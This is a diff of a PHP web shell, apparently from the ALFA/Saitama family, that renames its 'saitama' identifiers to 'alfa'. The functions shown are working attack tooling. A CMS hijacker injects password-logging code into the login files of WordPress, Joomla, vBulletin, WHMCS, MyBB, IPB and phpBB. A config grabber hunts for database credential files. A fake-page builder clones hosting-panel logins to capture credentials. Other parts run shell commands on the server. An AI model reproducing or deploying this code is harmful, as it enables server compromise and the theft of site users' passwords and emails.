-if(__saitamaziper($dirzip, $zipfile)){
+if(__alfaziper($dirzip, $zipfile)){
 echo __pre().'<center><p><font color="green">Success...!<br>'.$zipfile.'</font></p></center>';
 }else{echo __pre().'<center><p><font color="red">ERROR!!!...</font></p></center>';}
 }
 }
 echo '</div>';
-saitamafooter();
+alfafooter();
 }
-function __saitamaziper($source,$destination){
+function __alfaziper($source,$destination){
 	if(!extension_loaded('zip')||!file_exists($source)){
 		return false;
 	}
@@ -5402,18 +5403,18 @@ function __saitamaziper($source,$destination){
 	}
 	return $zip->close();
 }
-function saitamadeziper(){
-saitamahead();
-saitamaNum(8,9,10);
+function alfadeziper(){
+alfahead();
+AlfaNum(8,9,10);
 echo '<div class=header><p><center><p><div class="txtfont_header">| DeCompressor |</div></p>
 <form onSubmit="g(\'deziper\',null,null,null,this.dirzip.value,this.zipfile.value,\'>>\');return false;" method="post">
-<div class="txtfont">File: </div> <input type="text" name="dirzip" value="'.(!empty($_POST['saitama3'])?htmlspecialchars($_POST['saitama3']):htmlspecialchars($GLOBALS['cwd'])).'" size="60"/>
+<div class="txtfont">File: </div> <input type="text" name="dirzip" value="'.(!empty($_POST['alfa3'])?htmlspecialchars($_POST['alfa3']):htmlspecialchars($GLOBALS['cwd'])).'" size="60"/>
 <div class="txtfont">Extract To: </div> <input type="text" name="zipfile" value="'.$GLOBALS['cwd'].'" size="60"/>
 <input type="submit" value=" " name="ziper" />
 </form></center></p>';
-if(isset($_POST['saitama5']) && ($_POST['saitama5'] == '>>')){
-$dirzip = $_POST['saitama3'];
-$zipfile = $_POST['saitama4'];
+if(isset($_POST['alfa5']) && ($_POST['alfa5'] == '>>')){
+$dirzip = $_POST['alfa3'];
+$zipfile = $_POST['alfa4'];
 if(@!is_dir($zipfile)){
 	@mkdir($zipfile, 0777, true);
 }
@@ -5424,23 +5425,23 @@ $finfo = @finfo_open(FILEINFO_MIME_TYPE);
 $file_type = @finfo_file($finfo, $dirzip);
 @finfo_close($finfo);
 }else{
-	if($GLOBALS['sys']=='unix'&&_saitama_can_runCommand(true,true)){
-		$file_type = saitamaEx('file -b --mime-type ' . $dirzip);
+	if($GLOBALS['sys']=='unix'&&_alfa_can_runCommand(true,true)){
+		$file_type = alfaEx('file -b --mime-type ' . $dirzip);
 	}
 }
-if($GLOBALS['sys']!='unix'&&_saitama_can_runCommand(true,true)){
-saitamaEx("powershell expand-archive -path '".addslashes($dirzip)."' -destinationpath '".addslashes(basename($zipfile))."'");
+if($GLOBALS['sys']!='unix'&&_alfa_can_runCommand(true,true)){
+alfaEx("powershell expand-archive -path '".addslashes($dirzip)."' -destinationpath '".addslashes(basename($zipfile))."'");
 echo __pre().'<center><p>Done -> <b><font color="green">'.$zipfile.'</font></b></p></center>';
-}elseif($GLOBALS['sys']=='unix'&&!empty($file_type)&&_saitama_can_runCommand(true,true)&&(strlen(saitamaEx('which unzip')) > 0||strlen(saitamaEx('which tar')) > 0||strlen(saitamaEx('which gunzip')) > 0)){
+}elseif($GLOBALS['sys']=='unix'&&!empty($file_type)&&_alfa_can_runCommand(true,true)&&(strlen(alfaEx('which unzip')) > 0||strlen(alfaEx('which tar')) > 0||strlen(alfaEx('which gunzip')) > 0)){
 switch ($file_type) {
 	case 'application/zip':
-		saitamaEx("cd '".addslashes($zipfile)."';unzip '".addslashes($dirzip)."'");
+		alfaEx("cd '".addslashes($zipfile)."';unzip '".addslashes($dirzip)."'");
 	break;
 	case 'application/x-tar': case 'application/x-gzip': case 'application/x-gtar':
 		if(strstr(basename($dirzip), ".tar.gz")||strstr(basename($dirzip), ".tar")){
-			saitamaEx("cd '".addslashes($zipfile)."';tar xzf '".addslashes($dirzip)."'");
+			alfaEx("cd '".addslashes($zipfile)."';tar xzf '".addslashes($dirzip)."'");
 		}else{
-			saitamaEx("cd '".addslashes($zipfile)."';gunzip '".addslashes($dirzip)."'");
+			alfaEx("cd '".addslashes($zipfile)."';gunzip '".addslashes($dirzip)."'");
 		}
 	break;
 }
@@ -5491,11 +5492,11 @@ echo __pre().'<center><p><font color="green">Success...!<br>'.$zipfile.'</font> 
 }
 }
 echo '</div>';
-saitamafooter();
+alfafooter();
 }
-function saitamacmshijacker(){
-saitamahead();
-saitamaNum(5,6,7,8,9,10);
+function alfacmshijacker(){
+alfahead();
+AlfaNum(5,6,7,8,9,10);
 echo '<div class=header><br>
 <center><div class="txtfont_header">| Cms Hijacker |</div><br><br><form onSubmit="g(\'cmshijacker\',null,this.cmshi.value,this.saveto.value,\'>>\',this.cmspath.value);return false;" method=\'post\'>
 <div class="txtfont">CMS: <select style="width:100px;" name="cmshi">';
@@ -5503,19 +5504,19 @@ $cm_array = array("vb"=>"vBulletin","wp"=>"wordpress","jom"=>"joomla","whmcs"=>"
 foreach($cm_array as $key=>$val)echo '<option value="'.$key.'">'.$val.'</option>';
 echo("</select>");
 echo ' Path installed cms: <input size="50" type="text" name="cmspath" placeholder="ex: /home/user/public_html/vbulletin/">
-SaveTo: <input size="50" type="text" name="saveto" value="'.$GLOBALS['cwd'].'saitama.txt"></font>
+SaveTo: <input size="50" type="text" name="saveto" value="'.$GLOBALS['cwd'].'alfa.txt"></font>
 <input type="submit" name="btn" value=" "></form></center><br>';
-$cms = $_POST['saitama1'];
-$saveto = $_POST['saitama2'];
-$cmspath = $_POST['saitama4'];
-if(!empty($cms) AND !empty($saveto) AND $_POST['saitama4'] AND $_POST['saitama3'] == '>>'){
+$cms = $_POST['alfa1'];
+$saveto = $_POST['alfa2'];
+$cmspath = $_POST['alfa4'];
+if(!empty($cms) AND !empty($saveto) AND $_POST['alfa4'] AND $_POST['alfa3'] == '>>'){
 echo __pre();
-saitamaHijackCms($cms,$cmspath,$saveto);
+alfaHijackCms($cms,$cmspath,$saveto);
 }
 echo '</div>';
-saitamafooter();
+alfafooter();
 }
-function saitamaHijackCms($cms,$cmspath,$saveto){
+function alfaHijackCms($cms,$cmspath,$saveto){
 switch($cms){
 case "vb":
 hijackvBulletin($cmspath,$saveto);
@@ -5544,7 +5545,7 @@ break;
 }
 }
 function hijackvBulletin($path,$saveto){
-$code='$saitama_username = strtolower($vbulletin->GPC["vb_login_username"]);$saitama_password = $vbulletin->GPC["vb_login_password"];$saitama_file = "{saveto_path}";$sql_query = $vbulletin->db->query_read("SELECT * FROM " . TABLE_PREFIX . "user WHERE `username`=\'" . $saitama_username . "\'");while($row = $vbulletin->db->fetch_array($sql_query)){if(strlen($saitama_password) > 1 AND strlen($saitama_username) > 1){$fp1 = @fopen($saitama_file, "a+");@fwrite($fp1, $saitama_username . \' : \' .  $saitama_password." (" . $row["email"] . ")\n");@fclose($fp1); $f = @file($saitama_file);$new = array_unique($f);$fp = @fopen($saitama_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}}';
+$code='$alfa_username = strtolower($vbulletin->GPC["vb_login_username"]);$alfa_password = $vbulletin->GPC["vb_login_password"];$alfa_file = "{saveto_path}";$sql_query = $vbulletin->db->query_read("SELECT * FROM " . TABLE_PREFIX . "user WHERE `username`=\'" . $alfa_username . "\'");while($row = $vbulletin->db->fetch_array($sql_query)){if(strlen($alfa_password) > 1 AND strlen($alfa_username) > 1){$fp1 = @fopen($alfa_file, "a+");@fwrite($fp1, $alfa_username . \' : \' .  $alfa_password." (" . $row["email"] . ")\n");@fclose($fp1); $f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}}';
 $clearpw = 'defined(\'DISABLE_PASSWORD_CLEARING\')';
 $code=str_replace('{saveto_path}',$saveto,$code);
 $login = $path."/login.php";
@@ -5569,7 +5570,7 @@ hijackOutput(1);
 }
 }
 function hijackwp($path,$saveto){
-$code = '$saitama_file="{saveto_path}";$fp = fopen($saitama_file, "a+");fwrite($fp, $_POST[\'log\']." : ".$_POST[\'pwd\']." (".($user->user_email).")\n");fclose($fp);$f = @file($saitama_file);$new = array_unique($f);$fp = @fopen($saitama_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);';
+$code = '$alfa_file="{saveto_path}";$fp = fopen($alfa_file, "a+");fwrite($fp, $_POST[\'log\']." : ".$_POST[\'pwd\']." (".($user->user_email).")\n");fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);';
 $redirect_wp = '#if[ ]{0,}\([ ]{0,}![ ]{0,}is_wp_error\([ ]{0,}\$user[ ]{0,}\)[ ]{0,}&&[ ]{0,}![ ]{0,}\$reauth[ ]{0,}\)[ ]{0,}{#';
 $code=str_replace('{saveto_path}',$saveto,$code);
 $login=$path."/wp-login.php";
@@ -5588,7 +5589,7 @@ hijackOutput(1);
 }
 }
 function hijackJoomla($path,$saveto){
-$code = '<?php jimport(\'joomla.user.authentication\');$saitama_auth = & JAuthentication::getInstance();$SAITAMA_DATA = array(\'username\'=>$_POST[\'username\'],\'password\'=>$_POST[\'passwd\']);$saitama_options = array();$saitama_response = $saitama_auth->authenticate($SAITAMA_DATA, $saitama_options);if($saitama_response->status == 1){$saitama_file="{saveto_path}";$fp=@fopen($saitama_file,"a+");@fwrite($fp, $saitama_response->username.":".$_POST[\'passwd\']." ( ".$saitama_response->email." )\n");@fclose($fp);$f = @file($saitama_file);$new = array_unique($f);$fp = @fopen($saitama_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}?>';
+$code = '<?php jimport(\'joomla.user.authentication\');$Alfa_auth = & JAuthentication::getInstance();$Alfa_data = array(\'username\'=>$_POST[\'username\'],\'password\'=>$_POST[\'passwd\']);$Alfa_options = array();$Alfa_response = $Alfa_auth->authenticate($Alfa_data, $Alfa_options);if($Alfa_response->status == 1){$alfa_file="{saveto_path}";$fp=@fopen($alfa_file,"a+");@fwrite($fp, $Alfa_response->username.":".$_POST[\'passwd\']." ( ".$Alfa_response->email." )\n");@fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}?>';
 $code=str_replace('{saveto_path}',$saveto,$code);
 $comp=$path."/administrator/components/com_login/";
 if(@is_file($comp."/login.php")){
@@ -5608,7 +5609,7 @@ hijackOutput(1);
 }
 }
 function hijackWhmcs($path,$saveto){
-$code = '<?php if(isset($_POST[\'username\']) AND isset($_POST[\'password\']) AND !empty($_POST[\'username\']) AND !empty($_POST[\'password\'])){if($saitama_connect=@mysqli_connect($db_host,$db_username,$db_password,$db_name)){$saitama_file = "{saveto_path}";$saitama_uname = @$_POST[\'username\'];$saitama_pw = @$_POST[\'password\'];if(isset($_POST[\'language\'])){$saitama_q = "SELECT * FROM tbladmins WHERE `username` = \'$saitama_uname\' AND `password` = \'".md5($saitama_pw)."\'";$admin = true;}else{$saitama_q = "SELECT * FROM tblclients WHERE `email` = \'$saitama_uname\'";$admin = false;}$saitama_query = mysqli_query($saitama_connect, $saitama_q);if(mysqli_num_rows($saitama_query) > 0 ){$row = mysqli_fetch_array($saitama_query);$allow = true;if(!$admin){$__salt = explode(\':\', $row[\'password\']);$__encPW = md5($__salt[1].$_POST[\'password\']).\':\'.$__salt[1];if($row[\'password\'] == $__encPW){$allow = true;$row[\'username\'] = $row[\'email\'];}else{$allow = false;}}if($allow){$fp = @fopen($saitama_file, "a+");@fwrite($fp, $row[\'username\'] . \' : \' .  $saitama_pw." (" . $row["email"] . ") : ".($admin ? \'is_admin\' : \'is_user\')."\n");@fclose($fp);$f = @file($saitama_file);$new = array_unique($f);$fp = @fopen($saitama_file, "w");foreach($new as $values){@fwrite($fp, $values);}@fclose($fp);}}}}?>';
+$code = '<?php if(isset($_POST[\'username\']) AND isset($_POST[\'password\']) AND !empty($_POST[\'username\']) AND !empty($_POST[\'password\'])){if($alfa_connect=@mysqli_connect($db_host,$db_username,$db_password,$db_name)){$alfa_file = "{saveto_path}";$alfa_uname = @$_POST[\'username\'];$alfa_pw = @$_POST[\'password\'];if(isset($_POST[\'language\'])){$alfa_q = "SELECT * FROM tbladmins WHERE `username` = \'$alfa_uname\' AND `password` = \'".md5($alfa_pw)."\'";$admin = true;}else{$alfa_q = "SELECT * FROM tblclients WHERE `email` = \'$alfa_uname\'";$admin = false;}$alfa_query = mysqli_query($alfa_connect, $alfa_q);if(mysqli_num_rows($alfa_query) > 0 ){$row = mysqli_fetch_array($alfa_query);$allow = true;if(!$admin){$__salt = explode(\':\', $row[\'password\']);$__encPW = md5($__salt[1].$_POST[\'password\']).\':\'.$__salt[1];if($row[\'password\'] == $__encPW){$allow = true;$row[\'username\'] = $row[\'email\'];}else{$allow = false;}}if($allow){$fp = @fopen($alfa_file, "a+");@fwrite($fp, $row[\'username\'] . \' : \' .  $alfa_pw." (" . $row["email"] . ") : ".($admin ? \'is_admin\' : \'is_user\')."\n");@fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fwrite($fp, $values);}@fclose($fp);}}}}?>';
 $code=str_replace('{saveto_path}',$saveto,$code);
 $conf=$path."/configuration.php";
 if(@is_file($conf) AND @is_writable($conf)){
@@ -5622,7 +5623,7 @@ hijackOutput(1);
 }
 }
 function hijackMybb($path,$saveto){
-$code = '$saitama_q = $db->query("SELECT `email` FROM ".TABLE_PREFIX."users WHERE `username` = \'".$user[\'username\']."\'");$saitama_fetch = $db->fetch_array($saitama_q);$saitama_file = "{saveto_path}";$fp = @fopen($saitama_file, "a+");@fwrite($fp, $user[\'username\']." : ". $user[\'password\']." ( ".$saitama_fetch[\'email\']." )\n");@fclose($fp);$f = @file($saitama_file);$new = array_unique($f);$fp = @fopen($saitama_file, "w");foreach($new as $values){@fwrite($fp, $values);}@fclose($fp);';
+$code = '$alfa_q = $db->query("SELECT `email` FROM ".TABLE_PREFIX."users WHERE `username` = \'".$user[\'username\']."\'");$alfa_fetch = $db->fetch_array($alfa_q);$alfa_file = "{saveto_path}";$fp = @fopen($alfa_file, "a+");@fwrite($fp, $user[\'username\']." : ". $user[\'password\']." ( ".$alfa_fetch[\'email\']." )\n");@fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fwrite($fp, $values);}@fclose($fp);';
 $find = '$loginhandler->complete_login();';
 $code=str_replace('{saveto_path}',$saveto,$code);
 $login=$path."/member.php";
@@ -5641,7 +5642,7 @@ hijackOutput(1);
 }
 }
 function hijackIPB($path,$saveto){
-$code = '$saitama_q = $this->DB->buildAndFetch(array(\'select\' => \'email\', \'from\' => \'members\', \'where\' => \'name="\'.$username.\'" OR email="\'.$email.\'"\'));$saitama_file = "{saveto_path}";$fp = @fopen($saitama_file, "a+");@fwrite($fp, $_POST[\'ips_username\'].\' : \'.$_POST[\'ips_password\'].\' ( \'.$saitama_q[\'email\'].\' )\'."\n");@fclose($fp);$f = @file($saitama_file);$new = array_unique($f);$fp = @fopen($saitama_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);';
+$code = '$Alfa_q = $this->DB->buildAndFetch(array(\'select\' => \'email\', \'from\' => \'members\', \'where\' => \'name="\'.$username.\'" OR email="\'.$email.\'"\'));$Alfa_file = "{saveto_path}";$fp = @fopen($Alfa_file, "a+");@fwrite($fp, $_POST[\'ips_username\'].\' : \'.$_POST[\'ips_password\'].\' ( \'.$Alfa_q[\'email\'].\' )\'."\n");@fclose($fp);$f = @file($Alfa_file);$new = array_unique($f);$fp = @fopen($Alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);';
 $find = 'unset( $member[\'plainPassword\'] );';
 $code=str_replace('{saveto_path}',$saveto,$code);
 $login=$path."/admin/sources/handlers/han_login.php";
@@ -5660,7 +5661,7 @@ hijackOutput(1);
 }
 }
 function hijackPHPBB($path,$saveto){
-$code = '$saitama_u = request_var(\'username\', \'\');$saitama_p = request_var(\'password\', \'\');if($saitama_u != \'\' AND $saitama_p != \'\'){$saitama_response = $auth->login($saitama_u,$saitama_p);if($saitama_response[\'status\'] == LOGIN_SUCCESS){$saitama_file ="{saveto_path}";$fp = @fopen($saitama_file, "a+");@fwrite($fp, $saitama_u." : ".$saitama_p. " ( ".$saitama_response[\'user_row\'][\'user_email\']." )\n");@fclose($fp);$f = @file($saitama_file);$new = array_unique($f);$fp = @fopen($saitama_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}}';
+$code = '$Alfa_u = request_var(\'username\', \'\');$Alfa_p = request_var(\'password\', \'\');if($Alfa_u != \'\' AND $Alfa_p != \'\'){$Alfa_response = $auth->login($Alfa_u,$Alfa_p);if($Alfa_response[\'status\'] == LOGIN_SUCCESS){$Alfa_file ="{saveto_path}";$fp = @fopen($Alfa_file, "a+");@fwrite($fp, $Alfa_u." : ".$Alfa_p. " ( ".$Alfa_response[\'user_row\'][\'user_email\']." )\n");@fclose($fp);$f = @file($Alfa_file);$new = array_unique($f);$fp = @fopen($Alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}}';
 $find = 'case \'login\':';
 $code=str_replace('{saveto_path}',$saveto,$code);
 $login=$path."/ucp.php";
@@ -5679,7 +5680,7 @@ hijackOutput(1);
 }
 }
 function hijackOutput($c=0,$p=''){echo($c==0?"<center><font color='green'>Success</font> --> path: $p</center>":'<center><font color="red">Error in inject code !</font></center>');}
-function saitama_StrSearcher($dir,$string,$ext,$e,$arr=array()){
+function Alfa_StrSearcher($dir,$string,$ext,$e,$arr=array()){
 if(@is_dir($dir)){
 $files=@scandir($dir);
 foreach($files as $key => $value){
@@ -5698,12 +5699,12 @@ echo str_replace('\\','/',$path) . "<br>";
 }
 $results[] = $path;
 }elseif($value != "." && $value != "..") {
-saitama_StrSearcher($path,$string,$ext,$e,$results);
+Alfa_StrSearcher($path,$string,$ext,$e,$results);
 $results[] = $path;
 }}}}
-function saitamafakepage(){
-	saitamahead();
-	saitamaNum(9,10);
+function alfafakepage(){
+	alfahead();
+	AlfaNum(9,10);
 	echo '<div class=header><br>
 	<center><div class="txtfont_header">| Host Manager Fake page |</div></center><br><br><form onSubmit="g(\'fakepage\',null,this.clone_page.value,this.fake_root.value,\'>>\',this.logto.value,this.panel.value,this.inject_to.value,this.bind_on.value,this.count.value);return false;" method=\'post\'>
 	<div class="txtfont" style="position: relative;left: 50%;transform: translate(-50%);"><div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Panel: </span><select style="width:100px;" name="panel">';
@@ -5717,17 +5718,17 @@ function saitamafakepage(){
 	<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Log To: </span><input size="50" type="text" name="logto" value="'.$GLOBALS['cwd'].'logs.txt"></div>
 	<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Count of Invalid login: </span><input size="20" type="text" name="count" value="3" style="text-align:center;"></div>
 	<div style="text-align:center;"><input type="submit" name="btn" value=" "></div></div></form><br>';
-	$clone_page = $_POST['saitama1'];
-	$fake_root = $_POST['saitama2'];
-	$logto = $_POST['saitama4'];
-	$panel = $_POST['saitama5'];
-	$inject_to = $_POST['saitama6'];
-	$bind_on = $_POST['saitama7'];
-	$count = $_POST['saitama8'];
-	if(!empty($clone_page) && !empty($fake_root) && !empty($logto) && !empty($inject_to) && !empty($bind_on) && $_POST['saitama3'] == '>>'){
+	$clone_page = $_POST['alfa1'];
+	$fake_root = $_POST['alfa2'];
+	$logto = $_POST['alfa4'];
+	$panel = $_POST['alfa5'];
+	$inject_to = $_POST['alfa6'];
+	$bind_on = $_POST['alfa7'];
+	$count = $_POST['alfa8'];
+	if(!empty($clone_page) && !empty($fake_root) && !empty($logto) && !empty($inject_to) && !empty($bind_on) && $_POST['alfa3'] == '>>'){
 		echo __pre();
 		$target = $clone_page;
-		$curl = new saitamaCURL();
+		$curl = new AlfaCURL();
 		$source_page = $curl->Send($target);
 		if(!empty($source_page)){
 			$matched_form = "";
@@ -5766,7 +5767,7 @@ function saitamafakepage(){
 					@mkdir($fake_root, 0777, true);
 				}
 
-				$cookie_name = "saitama_fakepage_counter" . rand(9999,99999);
+				$cookie_name = "alfa_fakepage_counter" . rand(9999,99999);
 
 				$post_user = 'user';
 				$post_pass = 'pass';
@@ -5802,11 +5803,11 @@ function saitamafakepage(){
 		}
 	}
 	echo '</div>';
-	saitamafooter();
+	alfafooter();
 }
-function saitamaarchive_manager(){
-	saitamahead();
-	$file = $_POST['saitama2'];
+function alfaarchive_manager(){
+	alfahead();
+	$file = $_POST['alfa2'];
 	if(!file_exists($file)){
 		$file = $GLOBALS['cwd'];
 	}
@@ -5816,17 +5817,17 @@ function saitamaarchive_manager(){
 	<div class="txtfont">
 	Archive file: <input size="50" id="target" type="text" name="file" value="'.$file.'">
 	<input type="submit" name="btn" value=" "></div></form></center><br>';
-	if($_POST['saitama5']=='>>'){
+	if($_POST['alfa5']=='>>'){
 		//echo __pre();
 		echo '<hr><div style="margin-left: 12px;" archive_full="phar://'.$file.'" archive_name="'.basename($file).'" id="archive_dir_'.$rand_id.'" class="archive_dir_holder"><span>PWD: </span><div class="archive_pwd_holder" style="display:inline-block"><a>/</a></div></div>';
 		echo '<div style="padding: 10px;" id="archive_base_'.$rand_id.'">';
-		__saitama_open_archive_file($file, $rand_id);
+		__alfa_open_archive_file($file, $rand_id);
 		echo '</div>';
 	}
 	echo '</div>';
-	saitamafooter();
+	alfafooter();
 }
-function __saitama_open_archive_file($arch, $base_id=0){
+function __alfa_open_archive_file($arch, $base_id=0){
 	try{
 		$files = array();
 		$dirs = array();
@@ -5840,21 +5841,21 @@ function __saitama_open_archive_file($arch, $base_id=0){
 				 $files[] = array("name" => $file->getFileName(), "path" => $file->getPathname(), "type" => "file",  "modify" => $file_modify, "size" => $file_size);
 			 }
 		 }
-		 function __saitama_open_archive_usort($a, $b){
+		 function __alfa_open_archive_usort($a, $b){
 			 return strcmp(strtolower($a['name']), strtolower($b['name']))*1;
 		 }
-		 usort($dirs, "__saitama_open_archive_usort");
-		 usort($files, "__saitama_open_archive_usort");
+		 usort($dirs, "__alfa_open_archive_usort");
+		 usort($files, "__alfa_open_archive_usort");
 		 $files = array_merge($dirs, $files);
 		 echo '<table width="100%" class="main" cellspacing="0" cellpadding="2"><tbody><tr><th>Name</th><th>Size</th><th>Modify</th><th>Actions</th></tr>';
 		 $icon = '<img class="archive-icons" src="'.findicon('..','dir').'" width="30" height="30">';
-		 echo '<tr><th><a base_id="'.$base_id.'" class="archive-file-row" fname=".." onclick="saitamaOpenArchive(this);" path="'.dirname($arch.'.php').'">'.$icon.'<span class="archive-name archive-type-dir">| .. |</span></a><td>dir</td><td>-</td><td>-</td></tr>';
+		 echo '<tr><th><a base_id="'.$base_id.'" class="archive-file-row" fname=".." onclick="alfaOpenArchive(this);" path="'.dirname($arch.'.php').'">'.$icon.'<span class="archive-name archive-type-dir">| .. |</span></a><td>dir</td><td>-</td><td>-</td></tr>';
 		 foreach($files as $file){
 			 $icon = '<img class="archive-icons" src="'.findicon($file['name'],$file['type']).'" width="30" height="30">';
 			 if($file["type"] == "dir"){
-			 	echo '<tr><th><a base_id="'.$base_id.'" class="archive-file-row" onclick="saitamaOpenArchive(this);" path="'.$file["path"].'" fname="'.$file["name"].'">'.$icon.'<span class="archive-name archive-type-dir">| '.$file["name"].' |</span></a><td>dir</td><td>'.$file["modify"].'</td><td>-</td></tr>';
+			 	echo '<tr><th><a base_id="'.$base_id.'" class="archive-file-row" onclick="alfaOpenArchive(this);" path="'.$file["path"].'" fname="'.$file["name"].'">'.$icon.'<span class="archive-name archive-type-dir">| '.$file["name"].' |</span></a><td>dir</td><td>'.$file["modify"].'</td><td>-</td></tr>';
 		 	}else{
-				echo "<tr><th><a base_id='".$base_id."' class='archive-file-row' onclick=\"editor('".$file["path"]."','auto','','','','file');\">".$icon."<span class='archive-name archive-type-file' fname='".$file["name"]."'>".$file["name"]."</span></a><td>".saitamaSize($file["size"])."</td><td>".$file["modify"]."</td><td>-</td></tr>";
+				echo "<tr><th><a base_id='".$base_id."' class='archive-file-row' onclick=\"editor('".$file["path"]."','auto','','','','file');\">".$icon."<span class='archive-name archive-type-file' fname='".$file["name"]."'>".$file["name"]."</span></a><td>".alfaSize($file["size"])."</td><td>".$file["modify"]."</td><td>-</td></tr>";
 
 			}
 		 }
@@ -5863,29 +5864,29 @@ function __saitama_open_archive_file($arch, $base_id=0){
 		echo("0");
 	}
 }
-function saitamaopen_archive_dir(){
-	$dir = $_POST["saitama1"];
-	$base_id = $_POST["saitama2"];
-	__saitama_open_archive_file($dir, $base_id);
+function alfaopen_archive_dir(){
+	$dir = $_POST["alfa1"];
+	$base_id = $_POST["alfa2"];
+	__alfa_open_archive_file($dir, $base_id);
 }
-function saitamaconfig_grabber(){
-	saitamahead();
+function alfaconfig_grabber(){
+	alfahead();
 	echo '<div class=header><center><p><div class="txtfont_header">| Config Grabber |</div></p>';
 	echo '<form name="srch" onSubmit="g(\'config_grabber\',null,null,this.dir.value,this.ext.value,null,\'>>\');return false;" method=\'post\'>
 	<div class="txtfont">
 	Dir: <input size="50" id="target" type="text" name="dir" value="'.$GLOBALS['cwd'].'">
 	Ext: <small><font color="red">[ * = all Ext ]</font></small> <input id="ext" style="text-align:center;" type="text" name="ext" size="5" value="php">
 	<input type="submit" name="btn" value=" "></div></form></center><br>';
-	$dir = $_POST['saitama2'];
-	$ext = $_POST['saitama3'];
-	if($_POST['saitama5']=='>>'){
+	$dir = $_POST['alfa2'];
+	$ext = $_POST['alfa3'];
+	if($_POST['alfa5']=='>>'){
 		echo __pre();
-		saitama_ConfigGrabber($dir, $ext);
+		Alfa_ConfigGrabber($dir, $ext);
 	}
 	echo '</div>';
-	saitamafooter();
+	alfafooter();
 }
-function saitama_ConfigGrabber($dir, $ext) {
+function Alfa_ConfigGrabber($dir, $ext) {
 	$pattern = "#define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOST(?:'|\")[ ]{0,}|define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOSTNAME(?:'|\")[ ]{0,}|config\[(?:'|\")MasterServer(?:'|\")\]\[(?:'|\")password(?:'|\")\]|(?:'|\")database(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")|(?:'|\")(mysql|database)(?:'|\")[ ]{0,}=>[ ]{0,}array|db_name|db_user|db_pass|db_server|db_host|dbhost|dbname|dbuser|dbpass|database_name|database_user|database_pass|mysql_user|mysql_pass|mysqli_connect|mysql_connect|new[ ]{0,}mysqli#i";
 	$db_files = array("wp-config.php","configure.php","config.inc.php","configuration.php","config.php","conf.php","dbclass.php","class_core.php","dist-configure.php", "settings.php", "conf_global.php", "db.php", "connect.php", "confing.db.php", "config.db.php", "database.php");
 	if(@is_readable($dir)){
@@ -5894,7 +5895,7 @@ function saitama_ConfigGrabber($dir, $ext) {
 		$blacklist = array();
 		foreach ($globDirs as $dir) {
 			if(!@is_readable($dir)||@is_link($dir)) continue;
-			@saitama_ConfigGrabber($dir, $ext);
+			@Alfa_ConfigGrabber($dir, $ext);
 		}
 		foreach ($globFiles as $file){
 			$filee = @file_get_contents($file);
@@ -5904,26 +5905,26 @@ function saitama_ConfigGrabber($dir, $ext) {
 		}
 	}
 }
-function saitamasearcher(){
-saitamahead();
+function alfasearcher(){
+alfahead();
 echo '<div class=header><center><p><div class="txtfont_header">| Searcher |</div></p><h3><a href=javascript:void(0) onclick="g(\'searcher\',null,\'file\')">| Find Readable Or Writable Files | </a><a href=javascript:void(0) onclick="g(\'searcher\',null,\'str\')">| Find Files By Name | </a></h3></center>';
-if(isset($_POST['saitama1'])&&$_POST['saitama1']=='file'){
+if(isset($_POST['alfa1'])&&$_POST['alfa1']=='file'){
 echo '<center><div class="txtfont_header">| Find Readable Or Writable Files  |</div><br><br><form name="srch" onSubmit="g(\'searcher\',null,\'file\',this.filename.value,this.ext.value,this.method.value,\'>>\');return false;" method=\'post\'>
 <div class="txtfont">
-Method: <select style="width: 18%;" onclick="saitama_searcher_tool(this.value);" name="method"><option value="files">Find All Writable Files</option><option value="dirs">Find All Writable Dirs</option><option value="all">Find All Readable And Writable Files</option></select>
+Method: <select style="width: 18%;" onclick="alfa_searcher_tool(this.value);" name="method"><option value="files">Find All Writable Files</option><option value="dirs">Find All Writable Dirs</option><option value="all">Find All Readable And Writable Files</option></select>
 Dir: <input size="50" id="target" type="text" name="filename" value="'.$GLOBALS['cwd'].'">
 Ext: <small><font color="red">[ * = all Ext ]</font></small> <input id="ext" style="text-align:center;" type="text" name="ext" size="5" value="php">
 <input type="submit" name="btn" value=" "></div></form></center><br>';
-$dir = $_POST['saitama2'];
-$ext = $_POST['saitama3'];
-$method = $_POST['saitama4'];
-if($_POST['saitama5']=='>>'){
+$dir = $_POST['alfa2'];
+$ext = $_POST['alfa3'];
+$method = $_POST['alfa4'];
+if($_POST['alfa5']=='>>'){
 echo __pre();
 if(substr($dir,-1)=='/')$dir=substr($dir,0,-1);
-saitama_Searcher($dir,trim($ext),$method);
+Alfa_Searcher($dir,trim($ext),$method);
 }
 }
-if($_POST['saitama1']=='str'){
+if($_POST['alfa1']=='str'){
 echo '<center><div class="txtfont_header">| Find Files By Name / Find String In Files |</div><br><br><form onSubmit="g(\'searcher\',null,\'str\',this.dir.value,this.string.value,\'>>\',this.ext.value,this.method.value);return false;" method=\'post\'>
 <div class="txtfont">
 Method: <select name="method"><option value="name">Find Files By Name</option><option value="str">Find String In Files</option></select>
@@ -5931,30 +5932,30 @@ String: <input type="text" name="string" value="">
 Dir: <input size="50" type="text" name="dir" value="'.$GLOBALS['cwd'].'">
 Ext: <small><font color="red">[ * = all Ext ]</font></small> <input id="ext" style="text-align:center;" type="text" name="ext" size="5" value="php">
